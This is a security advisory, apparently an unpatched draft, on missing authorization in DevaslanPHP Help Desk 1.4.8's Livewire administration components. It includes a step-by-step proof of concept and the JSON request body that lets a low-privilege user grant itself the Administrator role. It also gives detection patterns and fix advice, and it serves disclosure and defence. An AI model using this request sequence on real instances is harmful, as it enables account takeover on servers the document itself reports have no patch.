# Security Advisory — Broken access control in administration Livewire components → privilege escalation (DevaslanPHP Help Desk)

> **Identifier:** [CVE to be requested / internal ID OV-2026-006]
> **Publication date:** [to be defined]
> **Last updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 8.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-862 — Missing Authorization (leading to CWE-269 — Improper Privilege Management)
> **Status:** Unpatched

---

## 1. Executive summary

A **Broken Access Control** vulnerability was identified in **DevaslanPHP Help Desk**
(`devaslanphp/help-desk`), a Laravel 9 + Livewire v2 + Filament v2 helpdesk application,
confirmed on the latest release **1.4.8** and on the `main` branch.

Authorization is enforced only at the **routing** and **UI** layers (blade `@can` and Filament
`->visible()`), never inside the Livewire action methods. Because every public method of a
mounted Livewire component is directly invocable via `POST /livewire/message/{component}`, **any
authenticated low-privileged user can invoke the administration actions regardless of their
role**.

This allows an account holding the lowest role to **assign itself the Administrator role
(privilege escalation)**, create arbitrary administrator accounts, and modify or delete any
user or role. The escalation was validated end-to-end in a controlled lab (a "Customer" account
became "Administrator" using only the Livewire endpoints).

---

## 2. Affected products

| Product / Component | Affected versions | Fixed version | Status |
|---|---:|---:|---|
| DevaslanPHP Help Desk (`devaslanphp/help-desk`) | ≤ 1.4.8 (all 1.x; and `main`) | — | Affected |

### Unaffected
- The ticket-details **page route** `/tickets/{ticket}/{slug}` is gated by the
  `can_access_ticket` middleware — but this gate protects only the initial page load, **not** the
  Livewire action methods reached afterwards.

---

## 3. Vulnerability description

The vulnerability is caused by **authorization being enforced in the wrong layer**.

1. The `/administration/*` routes are registered inside a group that applies only `auth` and
   `set_locale` middleware — there is **no role/permission gate** (`routes/web.php`).
2. The only authorization expressions in the administration components are blade `@can(...)` and
   Filament `->visible(fn () => auth()->user()->can(...))`. **Both only hide UI elements**; they
   do not prevent the method from executing when invoked directly.
3. Every `public` method of a mounted Livewire v2 component is callable from the client via
   `POST /livewire/message/{component}`. The administration action methods contain **no
   authorization check**.

| ID | Component / method (v1.4.8) | Effect |
|---|---|---|
| A1 | `Administration\Users::createUser()` / `updateUser($id)` | Renders the user dialog for a new or **arbitrary** user id (IDOR) — no check |
| A2 | `Administration\UsersDialog::save()` → `$user->syncRoles($this->roles)` | Grants arbitrary roles; `$roles` is a client-controlled public property — no check |
| A3 | `Administration\UsersDialog::doDeleteUser()` | Deletes the bound user — no check |
| A4 | `Administration\RolesDialog::save()` → `syncPermissions($this->permissions)` | Creates/edits roles with arbitrary permissions — no check |

### Reachability
The user dialog is rendered only when `$selectedUser` is set (`@if($selectedUser) @livewire('administration.users-dialog', ...)`). That property is populated by the **unguarded** `createUser()` / `updateUser($id)` methods, so the attacker simply calls one of them first; the server re-renders and returns the nested dialog component with a valid snapshot, after which `save()` can be invoked.

### Prerequisites
- Authentication required: yes — **any** authenticated low-privileged user (e.g. a "customer").
- User interaction: none.
- Access: remote (network).

---

## 4. Impact

- **Vertical privilege escalation:** a lowest-role user grants itself the Administrator role.
- **Creation of arbitrary administrator accounts** (attacker controls the email → activation link).
- **Modification/deletion of any user** (`updateUser($id)` binds `User::find($id)` with no
  ownership check; `doDeleteUser()` deletes it).
- **Creation/modification/deletion of roles and permissions.**

### Confidentiality: High — full administrative access to all data.
### Integrity: High — arbitrary changes to users, roles and permissions.
### Availability: High — deletion of users/roles.

---

## 5. Classification

### CVSS
- **Score:** 8.8 — **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

### CWE
- **CWE-862 — Missing Authorization** (primary)
- CWE-269 — Improper Privilege Management
- CWE-639 — Authorization Bypass Through User-Controlled Key (IDOR)

### CAPEC
- **CAPEC-233 — Privilege Escalation**

---

## 6. Exploitation scenario

1. A low-privileged "customer" account authenticates.
2. It loads `/administration/users` — the route returns HTTP 200 (no role gate), mounting the
   `administration.users` Livewire component.
3. It calls `updateUser(<own id>)` on that component (via the Livewire endpoint), which renders
   the nested `administration.users-dialog`.
4. It calls `save()` on the dialog with `roles = [<Administrator role id>]` → `syncRoles()`
   grants itself the Administrator role.
5. The account now has full administrative access.

---

## 7. Technical evidence

### Affected component
```text
routes/web.php                                          (/administration/* — only ['auth','set_locale'])
app/Http/Livewire/Administration/Users.php              (updateUser L210, createUser L221, resendActivationEmail L264)
app/Http/Livewire/Administration/UsersDialog.php        (save L145 -> syncRoles L156/L174; doDeleteUser)
app/Http/Livewire/Administration/RolesDialog.php        (save -> syncPermissions)
```

### UI guard is cosmetic
```php
// Users.php — the ->visible() only hides the button:
Action::make('edit')
    ->visible(fn () => auth()->user()->can('Update users'))
    ->action(fn (User $record) => $this->updateUser($record->id));
```

### Unguarded state change (sink)
```php
// UsersDialog.php — save(): no can()/authorize(); $roles is a client-controlled public property
public array $roles;
public function save(): void
{
    $data = $this->form->getState();
    // ... create or:
    $this->user->syncRoles($this->roles);   // grants arbitrary roles to any user
}
```

> **Note:** No tokens, cookies or real data are included in this advisory.

---

## 8. Proof of concept

Performed against an instance under the researcher's control (local lab, Help Desk 1.4.8,
SQLite). The attacker is `user@…` holding only the "Customer" role (View own tickets / Create
tickets). The run uses only the Livewire message endpoints.

```text
BEFORE (database):  user (id 2)  ->  roles = Customer

[1] POST /livewire/message/auth.login                  (log in as the low-privilege user)
[3] GET  /administration/users                          -> HTTP 200  (route not role-gated)
[4] POST /livewire/message/administration.users         -> callMethod updateUser(2)   (arbitrary id = IDOR)
        -> re-render mounts administration.users-dialog (valid snapshot)
[5] POST /livewire/message/administration.users-dialog  -> syncInput roles=[1]; callMethod save()
        -> save success

AFTER  (database):  user (id 2)  ->  roles = Administrator        <-- escalated
```

The nested-request body for step [5]:
```json
{
  "fingerprint": { "...": "from the dialog's wire:initial-data" },
  "serverMemo":  { "...": "from the dialog's wire:initial-data" },
  "updates": [
    { "type": "syncInput",  "payload": { "name": "roles", "value": [1] } },
    { "type": "callMethod", "payload": { "method": "save", "params": [] } }
  ]
}
```

### PoC limitations
- Executed only against the author's own lab instance.
- Does not remove or modify third-party data.
- Creates no persistence or backdoor beyond the role change under test.
- Contains no real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction steps

1. Install Help Desk 1.4.8 on a controlled instance; create an "Administrator" role and a
   low-privilege "Customer" user.
2. Authenticate as the Customer and load `/administration/users` (observe HTTP 200).
3. Issue `callMethod updateUser(<own id>)` to `POST /livewire/message/administration.users`.
4. From the response, take the `administration.users-dialog` snapshot and issue
   `syncInput roles=[<Administrator id>]` + `callMethod save` to
   `POST /livewire/message/administration.users-dialog`.
5. Verify the account now holds the Administrator role. Expected secure behavior: the action
   should be rejected (403) for a user lacking the relevant permission.

---

## 10. Mitigation

- Restrict/monitor who can authenticate to the admin UI.
- Monitor `POST /livewire/message/administration.*` requests from non-administrative sessions.
- Apply the fix below.

---

## 11. Fix

No fix available at this time (the project appears inactive).

### Recommended change
- Add an explicit authorization check at the start of **every** state-changing Livewire method
  (`createUser`, `updateUser`, `resendActivationEmail`, `UsersDialog::save`, `doDeleteUser`, and
  the `Roles*`, `Companies*`, `TicketTypes*`, `TicketStatuses*`, `TicketPriorities*` and
  `TicketDetails/*` equivalents), e.g. `abort_unless(auth()->user()->can('Update users'), 403);`.
- Validate that the actor may grant the specific roles/permissions requested.
- Enforce ownership via Policies where a model is resolved from a client-supplied id.
- Add role/permission middleware to the `/administration/*` route group and register it as a
  Livewire persistent middleware so it also covers `/livewire/message/*`.
- Treat `->visible()` / `@can` strictly as presentation; they are not a security boundary.

---

## 12. Detection and indicators

- `POST /livewire/message/administration.users`, `administration.users-dialog`,
  `administration.roles-dialog` originating from sessions without administrative permissions.
- Role/permission changes not attributable to an administrator action.

```text
/livewire/message/administration\.(users|users-dialog|roles-dialog)
```

---

## 13. Disclosure timeline

| Date | Event |
|---|---|
| 16/11/2026 | Vulnerability identified (source review) |
| 16/11/2026 | Vulnerability validated (controlled lab, self-promotion to Administrator) |
| [to be defined] | Vendor notified (`eloufirhatim@gmail.com`) |
| [to be defined] | CVE requested |
| [to be defined] | Advisory published |

---

## 14. Vendor communication

- **Vendor:** DevaslanPHP / Hatim Eloufir (`devaslanphp/help-desk`)
- **Channel:** e-mail to `eloufirhatim@gmail.com` (per repository `SECURITY.md`)
- **Status:** to be notified
- **Note:** the project appears inactive (last release 1.4.8 = 2022-09-30, last code commit
  2023-02), so a response is not expected.

---

## 15. Credits

- **Researcher:** Opaque Vector
- **Type:** Independent security researcher
- **Contact:** opaquevector@gmail.com
- **Profile:** https://github.com/opaquevector

---

## 16. References

- https://github.com/devaslanphp/help-desk
- https://github.com/devaslanphp/help-desk/blob/main/app/Http/Livewire/Administration/UsersDialog.php
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- CWE-269: https://cwe.mitre.org/data/definitions/269.html

---

## 17. Revision history

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal notice

This advisory is published as part of coordinated/responsible vulnerability disclosure, for
defensive and remediation purposes. The findings result from independent security research
conducted by the author against an instance under the author's own control. The author does not
authorize or endorse the use of this information for unauthorized access, service disruption, or
any unlawful activity.

---

## 19. Contact

- **E-mail:** opaquevector@gmail.com
